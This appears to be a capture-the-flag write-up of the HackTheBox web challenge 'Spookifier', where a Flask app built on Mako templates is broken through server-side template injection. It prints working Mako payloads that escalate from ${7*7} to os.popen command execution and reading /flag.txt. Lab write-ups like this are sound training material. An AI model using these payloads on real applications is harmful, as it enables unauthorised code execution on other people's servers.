---
title: Spookifier HTB Challenge (English)
image: https://tse1.mm.bing.net/th?id=OIG1.iKzTRYDeUwZgb8AvNvbH&pid=ImgGn
description: Challenge Spookifier HTB [Difuculty very easy]
categories: [Challenge,HackTheBox]
tags: [web,very easy]
---


## Introduction

N/A


### Machine Description

- Name: Spookifier

- Goal: Get the flag

- Difficulty: very easy

- Operating System: N/A

- link: [Spookifier](https://app.hackthebox.com/challenges/413)

  

### PDF Link

- PDF: [Link to PDF](https://github.com/juanbelin/Writeups-CTFs-Challenges/blob/main/HTB/Challenges/Challenge%20Spookifier.pdf)


We have this input where whatever we introduce we get their differents font styles:

![](/assets/img/Anexos/Pasted%20image%2020250402090826.png)

![](/assets/img/Anexos/Pasted%20image%2020250402090845.png)

We can try a **XSS Injecton** 
![](/assets/img/Anexos/Pasted%20image%2020250402090924.png)

It's worked, but this is not for this way.

If we check the web files we can affirm it's using _MakoTemplates_

```shell
❯ ls -l
drwxrwxrwx root root 4.0 KB Tue Nov  1 10:20:58 2022  application
.rwxrwxrwx root root 101 B  Tue Nov  1 09:38:18 2022  run.py
❯ cat run.py
───────┬────────────────────────────────────────────────────────────────────────────
       │ File: run.py
───────┼────────────────────────────────────────────────────────────────────────────
   1   │ from application.main import app
   2   │ 
   3   │ app.run(host='0.0.0.0', port=1337, debug=False, use_evalex=False)
```

```shell
❯ cat main.py
───────┬────────────────────────────────────────────────────────────────────────────
       │ File: main.py
───────┼────────────────────────────────────────────────────────────────────────────
   1   │ from flask import Flask, jsonify
   2   │ from application.blueprints.routes import web
   3   │ from flask_mako import MakoTemplates
   4   │ 
   5   │ app = Flask(__name__)
   6   │ MakoTemplates(app)
   7   │ 
   8   │ def response(message):
   9   │     return jsonify({'message': message})
  10   │ 
  11   │ app.register_blueprint(web, url_prefix='/')
  12   │ 
  13   │ @app.errorhandler(404)
  14   │ def not_found(error):
  15   │     return response('404 Not Found'), 404
  16   │ 
  17   │ @app.errorhandler(403)
  18   │ def forbidden(error):
  19   │     return response('403 Forbidden'), 403
  20   │ 
  21   │ @app.errorhandler(400)
  22   │ def bad_request(error):
  23   │     return response('400 Bad Request'), 400
```

So let's try **SSTI**

![](/assets/img/Anexos/Pasted%20image%2020250402091448.png)
it does not work with this payload, let's try with:

```shell
${7*7} 
```

![](/assets/img/Anexos/Pasted%20image%2020250402091506.png)

It worked. This is MakoTemplates so the next step is **command injection**:

```shell
${self.module.cache.util.os.system("id")}
```


![](/assets/img/Anexos/Pasted%20image%2020250402091908.png)

At firts I was not able to see the output, that's why we have to replace `os.system()` with `os.popen().read()`

```shell
${self.module.cache.util.os.popen('id').read()}
```
![](/assets/img/Anexos/Pasted%20image%2020250402092715.png)

Now we're able to see the output and we get the flag!

```shell
${self.module.cache.util.os.popen('cat /flag.txt').read()}
```

![](/assets/img/Anexos/Pasted%20image%2020250402092735.png)